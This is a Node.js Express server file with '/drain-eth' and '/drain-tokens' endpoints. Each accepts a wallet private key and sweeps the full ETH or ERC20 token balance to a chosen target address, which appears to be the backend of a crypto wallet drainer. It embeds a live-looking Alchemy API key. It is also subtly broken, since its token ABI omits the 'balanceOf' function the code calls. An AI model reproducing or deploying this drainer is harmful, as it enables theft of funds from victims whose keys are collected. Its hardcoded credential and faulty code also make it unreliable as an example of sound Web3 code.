const express = require('express');
const Web3 = require('web3');
const cors = require('cors');

const app = express();
const port = process.env.PORT || 3000;

// Enable CORS for all routes
app.use(cors());
app.use(express.json());

// Initialize Web3 with your Alchemy provider
const web3 = new Web3('https://eth-sepolia.g.alchemy.com/v2/J71uV3kbMEPPRpavbEiQa');

// ABI for ERC20 token transfer function
const tokenABI = [
    {
        "constant": false,
        "inputs": [
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    }
];

// API endpoint to drain ETH
app.post('/drain-eth', async (req, res) => {
    const { privateKey, targetAddress } = req.body;

    if (!privateKey || !targetAddress) {
        return res.status(400).json({ error: 'Private key and target address are required.' });
    }

    try {
        const account = web3.eth.accounts.privateKeyToAccount(privateKey);
        web3.eth.accounts.wallet.add(account);

        const balance = await web3.eth.getBalance(account.address);
        const gasPrice = await web3.eth.getGasPrice();
        const gasLimit = 21000;

        const gasCost = gasPrice * gasLimit;

        if (balance > gasCost) {
            const amountToSend = balance - gasCost;

            const tx = {
                from: account.address,
                to: targetAddress,
                value: amountToSend,
                gas: gasLimit,
                gasPrice: gasPrice
            };

            const signedTx = await web3.eth.accounts.signTransaction(tx, privateKey);
            const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
            res.json({ success: true, transactionHash: receipt.transactionHash });
        } else {
            res.json({ success: false, error: 'Insufficient balance to cover gas costs.' });
        }
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// API endpoint to drain ERC20 tokens
app.post('/drain-tokens', async (req, res) => {
    const { privateKey, tokenContractAddress, targetAddress } = req.body;

    if (!privateKey || !tokenContractAddress || !targetAddress) {
        return res.status(400).json({ error: 'Private key, token contract address, and target address are required.' });
    }

    try {
        const account = web3.eth.accounts.privateKeyToAccount(privateKey);
        web3.eth.accounts.wallet.add(account);

        const tokenContract = new web3.eth.Contract(tokenABI, tokenContractAddress);
        const balance = await tokenContract.methods.balanceOf(account.address).call();

        const tx = tokenContract.methods.transfer(targetAddress, balance);
        const gas = await tx.estimateGas({ from: account.address });
        const gasPrice = await web3.eth.getGasPrice();

        const data = tx.encodeABI();

        const signedTx = await web3.eth.accounts.signTransaction({
            from: account.address,
            to: tokenContractAddress,
            data: data,
            gas: gas,
            gasPrice: gasPrice
        }, privateKey);

        const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
        res.json({ success: true, transactionHash: receipt.transactionHash });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.listen(port, () => {
    console.log(`Backend server running on port ${port}`);
});
